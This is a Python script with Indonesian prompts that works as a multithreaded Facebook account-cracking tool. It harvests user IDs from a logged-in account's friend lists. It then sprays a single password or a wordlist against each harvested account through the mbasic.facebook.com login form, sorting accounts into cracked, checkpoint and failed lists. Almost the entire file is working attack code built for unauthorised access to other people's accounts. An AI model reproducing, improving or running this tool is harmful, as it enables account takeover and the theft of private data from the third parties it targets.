import os
import re
import sys
import time
import threading

while True:
    try:
        import app
        import requests
        break
    except ImportError:
        print 'installing...'
        os.system('{} -m pip install -r {}{}'.format(sys.executable, os.path.dirname(os.path.realpath(__file__)), '/requirements.txt'))

try:
    from queue import Queue
except ImportError:
    from Queue import Queue


class attack(threading.Thread):
    def __init__(self, queue_data):
        super(attack, self).__init__()

        self.queue_data = queue_data
        self.requests = requests
        self.daemon = True

        self.facebook_signin = 'https://mbasic.facebook.com/login/device-based/regular/login/'
        self.facebook_signin2 = 'https://mbasic.facebook.com/login.php'

    def run(self):
        while True:
            username, password = self.queue_data.get()
            self.signin(username, password)
            self.queue_data.task_done()

    def signin(self, username, password):
        global success, checkpoint, failed
        while True:
            try:
                response = self.requests.request('post', self.facebook_signin, data={'email': username, 'pass': password, 'login': 'Log In'}, headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}, timeout=20)
                if '/home.php' in response.url:
                    success.append('{} [{}]'.format(username, password))
                    app.log('[G1]{} [G2]{}'.format(username, password))
                elif '/checkpoint' in response.url:
                    checkpoint.append('{} [{}]'.format(username, password))
                    app.log('[Y1]{} [Y2]{}'.format(username, password))
                else:
                    failed.append('{} [{}]'.format(username, password))
                    app.log('[R1]{} [R2]{}'.format(username, password))
                break
            except requests.exceptions.ConnectionError:
                app.log('[P1]{} [P2]{}'.format(username, password))
            except requests.exceptions.Timeout:
                app.log('[P1]{} [P2]{}'.format(username, password))
            except Exception as exception:
                app.log(exception)
                break

facebook = app.facebook(freemode=False)

def facebook_signin():
    if facebook.authenticated == True:
        app.log('[C1]mengotentikasi..\n')
        return
    app.log('masukkan username dan password /enter untuk keluar')
    username = app.str_input('Username', validate=False)
    if not username:
        app.log('\n[R1]login gagal\n')
        return
    password = app.str_input('Password', validate=False, enter=True)
    if not password:
        app.log('[R1]Coba lagi!!\n')
        return
    facebook.signin(username, password)

def facebook_take_users_from_user_friend_list():
    while True:
        if facebook.authenticated == False:
            app.log('[R1]login dulu gans!\n')
            time.sleep(2)
            break
        app.log('ambil id dari id teman [enter u/ batal')
        username = app.str_input('Username', validate=False, enter=True)
        if username:
            result = facebook.take_users_from_friend_list(username)        
            if result:
                facebook.save_users()
        else: break

success, checkpoint, failed, total = [], [], [], 0

def facebook_attack_result():
    app.log('\n[G1]Berhasil {} [Y1]Checkpoint {} [R1]Gagal {} [C1]Scanned {} [P1]Total {}\n'.format(len(success), len(checkpoint), len(failed), len(success)+len(checkpoint)+len(failed),total))

def facebook_attack(manual=True, threads=20):
    global total
    while True:
        queue_data = Queue()
        passwords = []
        try:
            file_users = list(filter(None, open(os.path.dirname(os.path.abspath(__file__))+'/txt/users.txt', 'r').read().splitlines()))
            file_users_all = list(filter(None, open(os.path.dirname(os.path.abspath(__file__))+'/txt/users-all.txt', 'r').read().splitlines()))
            file_users_temp = list(filter(None, open(os.path.dirname(os.path.abspath(__file__))+'/txt/users-temp.txt', 'r').read().splitlines()))
            app.log('1. data diambil          {}'.format(len(file_users)))
            app.log('2. semua.data            {}'.format(len(file_users_all)))
            app.log('3. data 2                {}'.format(len(file_users_temp)))
            app.log('4. hapus user data')
            app.log('[R1]0. kembali\n')
            choice = app.opt_input('==>', ['1','2','3','4','0'], enter=True)
            if choice == '0':
                app.log('[R1]okey\n')
                return
            elif choice == '4':
                os.system('rm -rf txt/users-temp.txt')
                os.system('rm -rf txt/users.txt , txt/users-all.txt')
                app.log('[Y1]Sukses menghapus')
                time.sleep(2)
                return
            elif choice == '1':
                users = file_users
            elif choice == '2':
                users = file_users_all
            elif choice == '3':
                users = file_users_temp
        except Exception as exception:
            app.log('[R1]ambil user id dulu!\n')
            time.sleep(1.5)
            return
        if manual == True:
            app.log('masukkan password untuk mencoba crack semua user. [enter for cancel]')
            password = app.str_input('Passsword', validate=False, enter=True)
            if not password:
                app.log('[R1]okey.\n')
                return
            passwords.append(password)
        else:
            while True:
                try:
                    app.log('Masukkan password list enter untuk keluar')
                    wordlist = app.str_input('Wordlist', validate=False, enter=True)
                    if not wordlist:
                        app.log('[R1]keluar.\n')
                        return
                    passwords = list(filter(None, open(wordlist, 'r').read().splitlines()))
                    break
                except Exception as exception:
                    app.log('[R1]File tidak ditemukan.\n')
        for password in passwords:
            for user in users:
                username = user.split(' - ')[0]
                if username:
                    queue_data.put((username, password))
        app.log('[G1]Usernames                   [Y1]{}'.format(len(users)))
        app.log('[G1]Passwords                   [Y1]{}'.format(len(passwords)))
        app.log('[G1]Total                       [Y1]{}\n'.format(queue_data.qsize()))
        choice = app.opt_input('Lanjut ? y/n  ', ['y','n','c'], enter=True)
        total = queue_data.qsize()
        if choice == 'y':
            break
        if choice == 'c':
            return
    app.log('[G1]Berhasil-[Y1]Checkpoint-[R1]Gagal- [P1]Koneksi error\n')
    for i in range(threads):
        attack(queue_data).start()
    while True:
        try:
            queue_data.join()
            facebook_attack_result()
            success, checkpoint, failed = [], [], []
            break
        except KeyboardInterrupt:
            with threading.RLock():
                facebook_attack_result()
                success, checkpoint, failed = [], [], []
                app.exit()

def main():
    while True:
        app.log('''[P1] menu 
============================================= ''')
        app.log('1. Login')
        app.log('2. ambil username pengguna/teman/teman dari teman')
        app.log('3. crack dari semua data yang telah diambil')
        app.log('4. crack pake wordlistt')
        app.log('[R1]0. Exit/modar')
        app.log()
        result = app.opt_input('==>', ['1','2','3','4','0'], enter=True)
        if result == '0':
            app.exit(confirm=False)
        elif result == '1':
            facebook_signin()
        elif result == '2':
            facebook_take_users_from_user_friend_list()
        elif result == '3':
            facebook_attack(manual=True)
        elif result == '4':
            facebook_attack(manual=False)

if __name__=='__main__':
    main()

